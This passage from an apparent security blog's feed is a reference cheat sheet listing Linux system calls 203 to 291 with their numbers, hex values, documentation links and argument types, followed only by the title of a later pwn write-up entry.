*</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">203</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0xcb</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">204</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0xcc</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">205</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0xcd</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">206</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0xce</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">207</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0xcf</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">208</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0xd0</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">209</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0xd1</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">210</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0xd2</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">211</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0xd3</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">212</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0xd4</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">213</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xd5</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">214</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0xd6</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">215</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0xd7</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">216</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td align="center">0xd8</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">217</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0xd9</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">218</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0xda</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0xdb</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">220</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0xdc</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">221</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0xdd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td>mmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap">cs/</a></td><td align="center">0xde</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">223</td><td>fadvise64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64">cs/</a></td><td align="center">0xdf</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">224</td><td>swapon</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0xe0</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0xe1</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0xe2</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">227</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0xe3</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">228</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0xe4</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">229</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0xe5</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0xe6</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0xe7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0xe8</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0xe9</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0xea</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">235</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0xeb</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">236</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0xec</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">237</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0xed</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">238</td><td>migrate_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/migrate_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*migrate_pages">cs/</a></td><td align="center">0xee</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *from</td><td>const unsigned long *to</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0xef</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">240</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0xf0</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">241</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0xf1</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">242</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0xf2</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">243</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0xf3</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">244</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf4</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">245</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf5</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">246</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf6</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">247</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf7</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">248</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf8</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">249</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf9</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">250</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfa</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">251</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfb</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">252</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfc</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">253</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfd</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">254</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfe</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">255</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xff</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">256</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x100</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">257</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x101</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">258</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x102</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">259</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x103</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">260</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x104</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">261</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x105</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x106</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x107</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">264</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x108</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">265</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x109</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">266</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x10a</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x10b</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x10c</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x10d</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x10e</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">271</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x10f</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">272</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x110</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">273</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x111</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">274</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x112</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">275</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x113</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">276</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x114</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">277</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x115</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">278</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x116</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x117</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">280</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x118</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">281</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x119</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">282</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x11a</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x11b</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x11c</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">285</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x11d</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">286</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x11e</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">287</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x11f</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">288</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x120</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">289</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x121</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x122</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">291</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x123</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">Common syscall.</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
    
  </entry>
  
  <entry>
    <title>BlueWhaleOJ Pwn WriteUp Part 1</title>
